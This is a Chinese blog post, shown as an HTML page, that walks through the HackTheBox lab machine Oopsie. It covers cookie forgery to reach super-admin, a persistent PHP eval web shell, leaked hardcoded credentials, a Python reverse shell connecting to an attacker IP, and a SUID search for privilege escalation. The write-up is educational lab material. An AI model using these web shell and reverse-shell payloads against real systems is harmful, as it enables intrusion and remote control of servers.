@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-Oopsie - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-Oopsie" />
+<meta property="og:description" content="HackTheBox靶机Oopsie" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-oopsie/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-09T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-01-09T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-Oopsie"/>
+<meta name="twitter:description" content="HackTheBox靶机Oopsie"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-oopsie/" /><link rel="prev" href="https://mi3aka.eu.org/htb-horizontall/" /><link rel="next" href="https://mi3aka.eu.org/htb-pandora/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-Oopsie",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-oopsie\/"
+        },"genre": "posts","wordcount":  949 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-oopsie\/","datePublished": "2022-01-09T14:08:30+00:00","dateModified": "2022-01-09T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-Oopsie</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-09">2022-01-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 949 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#文件上传获取user权限">文件上传获取user权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前期工作">前期工作</h2>
+<p>nmap扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141459039.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141459039.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141459039.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141459039.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141459039.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141459039.png" /></p>
+<p>题目提示要进行登录操作,发现存在路径<code>cdn-cgi/login</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141522417.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141522417.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141522417.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141522417.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141522417.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141522417.png" /></p>
+<p><a href="http://10.129.21.248/cdn-cgi/login/admin.php" target="_blank" rel="noopener noreffer ">Login as guest</a>跳转到<code>cdn-cgi/login/admin.php</code></p>
+<p>点击account,注意到<code>?content=accounts&amp;id=2</code>,id参数可能存在注入??</p>
+<p>发现对于不同的id,回显的结果不同,用intruder进行爆破</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141644629.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141644629.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141644629.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141644629.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141644629.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141644629.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141643534.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141643534.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141643534.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141643534.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141643534.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141643534.png" /></p>
+<h2 id="文件上传获取user权限">文件上传获取user权限</h2>
+<p><a href="http://10.129.21.248/cdn-cgi/login/admin.php?content=uploads" target="_blank" rel="noopener noreffer ">cdn-cgi/login/admin.php?content=uploads 文件上传</a></p>
+<p>提示要super admin权限</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141802996.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141802996.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141802996.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141802996.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141802996.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141802996.png" /></p>
+<p>注意到在<code>Cookie</code>中定义了<code>user</code>和<code>role</code>,网站可能根据cookie来判断用户身份,根据爆破得到的id和name替换cookie中的值,成功冒充super admin</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141805958.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141805958.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141805958.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141805958.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141805958.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141805958.png" /></p>
+<p>上传webshell即可,但发现疑似存在定时清理程序,因此上传不死马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">ignore_user_abort</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;shell.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php @eval($_POST[a]);?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">usleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>/var/www/html/cdn-cgi/login/admin.php</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;content&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;clients&#34;</span><span class="o">&amp;&amp;</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;orgId&#34;</span><span class="p">]</span><span class="o">!=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;select name,email from clients where id=?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s1">&#39;i&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;orgId&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$stmt</span><span class="o">=</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$stmt</span><span class="o">=</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$name</span><span class="o">=</span><span class="nv">$stmt</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$email</span><span class="o">=</span><span class="nv">$stmt</span><span class="p">[</span><span class="s2">&#34;email&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s1">&#39;&lt;table&gt;&lt;tr&gt;&lt;th&gt;Client ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;orgId&#34;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;td&gt;&#39;</span><span class="o">.</span><span class="nv">$email</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&lt;/table&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>/var/www/html/cdn-cgi/login/db.php</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;robert&#39;</span><span class="p">,</span><span class="s1">&#39;M3g4C0rpUs3r!&#39;</span><span class="p">,</span><span class="s1">&#39;garage&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可能可以作为<code>robert</code>用户的密码</p>
+<p>在<code>/var/www/html/cdn-cgi/login/index.php</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;admin&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;MEGACORP_4dm1n!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$cookie_name</span> <span class="o">=</span> <span class="s2">&#34;user&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$cookie_value</span> <span class="o">=</span> <span class="s2">&#34;34322&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">setcookie</span><span class="p">(</span><span class="nv">$cookie_name</span><span class="p">,</span> <span class="nv">$cookie_value</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">),</span> <span class="s2">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">),</span> <span class="s2">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /cdn-cgi/login/admin.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>存在python3,利用其进行反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">ip</span><span class="o">=</span><span class="s2">&#34;10.10.16.45&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="o">=</span><span class="mi">8000</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-i&#34;</span><span class="p">])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将反弹回来的shell转换为交互式的shell</p>
+<p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141956768.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141956768.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141956768.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141956768.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141956768.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141956768.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141957154.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141957154.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141957154.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141957154.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141957154.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141957154.png" /></p>
+<p>可以通过ssh直接连接</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141725083.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141725083.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141725083.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141725083.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141725083.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141725083.png" /></p>
+<h2 id="获取root权限">获取root权限</h2>
+<p>题目提示存在<code>SUID</code></p>
+<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robert@oopsie:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span>,1001<span class="o">(</span>bugtracker<span class="o">)</span>
+</span></span><span class="line"><span class="cl">robert@oopsie:~$ find / -user root -perm -4000 -print 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/snap/core/11420/bin/mount
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">/usr/bin/newuidmap
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/bugtracker
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/pkexec
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/traceroute6.iputils
+</span></span><span class="line"><span class="cl">/usr/bin/newgidmap
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现<code>/usr/bin/bugtracker</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142000440.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142000440.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142000440.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142000440.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142000440.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142000440.png" /></p>
